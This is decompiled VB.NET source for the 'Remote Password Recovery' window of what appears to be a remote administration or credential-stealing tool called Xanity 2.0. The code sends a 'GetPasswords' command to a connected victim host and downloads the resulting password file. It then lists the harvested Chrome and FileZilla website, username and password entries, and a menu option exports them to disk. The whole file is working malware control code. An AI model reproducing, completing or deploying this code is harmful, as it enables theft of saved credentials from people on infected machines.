Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class passes
        Inherits Form
        ' Methods
        Public Sub New()
            passes.__ENCAddToList(Me)
            Me.server = New API
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = passes.__ENCList
            SyncLock list
                If (passes.__ENCList.Count = passes.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (passes.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = passes.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                passes.__ENCList.Item(index) = passes.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    passes.__ENCList.RemoveRange(index, (passes.__ENCList.Count - index))
                    passes.__ENCList.Capacity = passes.__ENCList.Count
                End If
                passes.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        Public Sub check()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWrite(AddressOf Me.Write), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(passes))
            Me.ImageList1 = New ImageList(Me.components)
            Me.ContextMenuStrip1 = New ContextMenuStrip(Me.components)
            Me.RefreshToolStripMenuItem = New ToolStripMenuItem
            Me.SavePasswordsToolStripMenuItem = New ToolStripMenuItem
            Me.FormSkin1 = New FormSkin
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.ListView1 = New ListView
            Me.ColumnHeader1 = New ColumnHeader
            Me.ColumnHeader2 = New ColumnHeader
            Me.ColumnHeader3 = New ColumnHeader
            Me.ColumnHeader4 = New ColumnHeader
            Me.FlatMini1 = New FlatMini
            Me.FlatMax1 = New FlatMax
            Me.FlatClosePasses1 = New FlatClosePasses
            Me.ContextMenuStrip1.SuspendLayout
            Me.FormSkin1.SuspendLayout
            Me.SuspendLayout
            Me.ImageList1.ImageStream = DirectCast(manager.GetObject("ImageList1.ImageStream"), ImageListStreamer)
            Me.ImageList1.TransparentColor = Color.Transparent
            Me.ImageList1.Images.SetKeyName(0, "Unbenannt-1.png")
            Me.ImageList1.Images.SetKeyName(1, "Unbenannt-1.png")
            Me.ContextMenuStrip1.Items.AddRange(New ToolStripItem() { Me.RefreshToolStripMenuItem, Me.SavePasswordsToolStripMenuItem })
            Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
            Dim size2 As New Size(&H9D, &H30)
            Me.ContextMenuStrip1.Size = size2
            Me.RefreshToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.RefreshToolStripMenuItem.ForeColor = Color.White
            Me.RefreshToolStripMenuItem.Image = DirectCast(manager.GetObject("RefreshToolStripMenuItem.Image"), Image)
            Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
            size2 = New Size(&H9C, &H16)
            Me.RefreshToolStripMenuItem.Size = size2
            Me.RefreshToolStripMenuItem.Text = "Refresh"
            Me.SavePasswordsToolStripMenuItem.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.SavePasswordsToolStripMenuItem.ForeColor = Color.White
            Me.SavePasswordsToolStripMenuItem.Image = DirectCast(manager.GetObject("SavePasswordsToolStripMenuItem.Image"), Image)
            Me.SavePasswordsToolStripMenuItem.Name = "SavePasswordsToolStripMenuItem"
            size2 = New Size(&H9C, &H16)
            Me.SavePasswordsToolStripMenuItem.Size = size2
            Me.SavePasswordsToolStripMenuItem.Text = "Save Passwords"
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H6F, &H27, &H95)
            Me.FormSkin1.BorderColor = Color.FromArgb(&H35, &H3A, 60)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.ListView1)
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatClosePasses1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.DeepPink
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            size2 = New Size(&H2C5, &H12A)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "Remote Password Recovery"
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H116)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.DeepPink
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H2C5, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 4
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.ListView1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ListView1.Columns.AddRange(New ColumnHeader() { Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4 })
            Me.ListView1.ContextMenuStrip = Me.ContextMenuStrip1
            Me.ListView1.ForeColor = Color.White
            Me.ListView1.FullRowSelect = True
            Me.ListView1.GridLines = True
            point2 = New Point(3, &H37)
            Me.ListView1.Location = point2
            Me.ListView1.Name = "ListView1"
            size2 = New Size(&H2BF, &HDB)
            Me.ListView1.Size = size2
            Me.ListView1.SmallImageList = Me.ImageList1
            Me.ListView1.TabIndex = 3
            Me.ListView1.UseCompatibleStateImageBehavior = False
            Me.ListView1.View = View.Details
            Me.ColumnHeader1.Text = "Website"
            Me.ColumnHeader1.Width = &H158
            Me.ColumnHeader2.Text = "Browser"
            Me.ColumnHeader2.Width = &H4F
            Me.ColumnHeader3.Text = "Username"
            Me.ColumnHeader3.Width = &H99
            Me.ColumnHeader4.Text = "Password"
            Me.ColumnHeader4.Width = &H66
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H277, 12)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = 2
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H28F, 12)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = 1
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatClosePasses1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatClosePasses1.BackColor = Color.White
            Me.FlatClosePasses1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatClosePasses1.Font = New Font("Marlett", 10!)
            point2 = New Point(&H2A7, 13)
            Me.FlatClosePasses1.Location = point2
            Me.FlatClosePasses1.Name = "FlatClosePasses1"
            size2 = New Size(&H12, &H12)
            Me.FlatClosePasses1.Size = size2
            Me.FlatClosePasses1.TabIndex = 0
            Me.FlatClosePasses1.Text = "FlatClosePasses1"
            Me.FlatClosePasses1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H2C5, &H12A)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "passes"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "passes"
            Me.TransparencyKey = Color.Fuchsia
            Me.ContextMenuStrip1.ResumeLayout(False)
            Me.FormSkin1.ResumeLayout(False)
            Me.ResumeLayout(False)
        End Sub

        Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.ListView1.Items.Clear
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("GetPasswords", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_pass.txt")
                Me.x = New Thread(New ThreadStart(AddressOf Me.check))
                Me.x.Start
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub SavePasswordsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str As String
                Dim dialog As New SaveFileDialog
                Dim dialog2 As SaveFileDialog = dialog
                dialog2.InitialDirectory = Application.StartupPath
                dialog2.Title = "Save Passwords..."
                dialog2 = Nothing
                Dim result As DialogResult = dialog.ShowDialog
                Dim num2 As Integer = (Me.ListView1.Items.Count - 1)
                Dim i As Integer = 0
                Do While (i <= num2)
                    str = String.Concat(New String() { str, Me.ListView1.Items.Item(i).SubItems.Item(1).Text, "|", Me.ListView1.Items.Item(i).SubItems.Item(0).Text, ":", Me.ListView1.Items.Item(i).SubItems.Item(2).Text, ":", Me.ListView1.Items.Item(i).SubItems.Item(3).Text, ChrW(13) & ChrW(10) })
                    i += 1
                Loop
                If (result = DialogResult.OK) Then
                    File.WriteAllText(dialog.FileName, str)
                End If
                Me.FlatStatusBar1.Text = "Passwords successfully saved!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub Write(ByVal txt As String)
            Try 
                Dim text1 As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim text2 As String = Me.connected.Split(New Char() { "|"c })(1)
                Dim box As New TextBox With { _
                    .Text = txt _
                }
                Dim str4 As String
                For Each str4 In box.Lines
                    Dim strArray As String() = str4.Split(New Char() { "|"c })
                    Dim text As String = strArray(0)
                    Dim str5 As String = strArray(1)
                    Dim str6 As String = strArray(2)
                    Dim str7 As String = strArray(3)
                    Select Case str5
                        Case "Chrome"
                            Dim item As New ListViewItem([text], 0)
                            item.SubItems.Add(str5)
                            item.SubItems.Add(str6)
                            item.SubItems.Add(str7)
                            Me.ListView1.Items.AddRange(New ListViewItem() { item })
                            Exit Select
                        Case "FileZilla"
                            Dim item2 As New ListViewItem([text], 1)
                            item2.SubItems.Add(str5)
                            item2.SubItems.Add(str6)
                            item2.SubItems.Add(str7)
                            Me.ListView1.Items.AddRange(New ListViewItem() { item2 })
                            Exit Select
                    End Select
                Next
                Me.FlatStatusBar1.Text = "Passwords received successfully! "
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub


        ' Properties
        Friend Overridable Property ColumnHeader1 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader1 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader2 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader2 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader3 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader3 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader4 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader4 = value
            End Set
        End Property

        Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._ContextMenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._ContextMenuStrip1 = value
            End Set
        End Property

        Friend Overridable Property FlatClosePasses1 As FlatClosePasses
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatClosePasses1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatClosePasses)
                Me._FlatClosePasses1 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property ImageList1 As ImageList
            <DebuggerNonUserCode> _
            Get
                Return Me._ImageList1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ImageList)
                Me._ImageList1 = value
            End Set
        End Property

        Friend Overridable Property ListView1 As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._ListView1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListView)
                Me._ListView1 = value
            End Set
        End Property

        Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._RefreshToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RefreshToolStripMenuItem_Click)
                If (Not Me._RefreshToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RefreshToolStripMenuItem.Click, handler
                End If
                Me._RefreshToolStripMenuItem = value
                If (Not Me._RefreshToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RefreshToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property SavePasswordsToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._SavePasswordsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SavePasswordsToolStripMenuItem_Click)
                If (Not Me._SavePasswordsToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SavePasswordsToolStripMenuItem.Click, handler
                End If
                Me._SavePasswordsToolStripMenuItem = value
                If (Not Me._SavePasswordsToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SavePasswordsToolStripMenuItem.Click, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("ColumnHeader1")> _
        Private _ColumnHeader1 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader2")> _
        Private _ColumnHeader2 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader3")> _
        Private _ColumnHeader3 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader4")> _
        Private _ColumnHeader4 As ColumnHeader
        <AccessedThroughProperty("ContextMenuStrip1")> _
        Private _ContextMenuStrip1 As ContextMenuStrip
        <AccessedThroughProperty("FlatClosePasses1")> _
        Private _FlatClosePasses1 As FlatClosePasses
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("ImageList1")> _
        Private _ImageList1 As ImageList
        <AccessedThroughProperty("ListView1")> _
        Private _ListView1 As ListView
        <AccessedThroughProperty("RefreshToolStripMenuItem")> _
        Private _RefreshToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SavePasswordsToolStripMenuItem")> _
        Private _SavePasswordsToolStripMenuItem As ToolStripMenuItem
        Private components As IContainer
        Public connected As String
        Private server As API
        Private url As String
        Private x As Thread

        ' Nested Types
        Public Delegate Sub DelegateWrite(ByVal txt As String)
    End Class
End Namespace

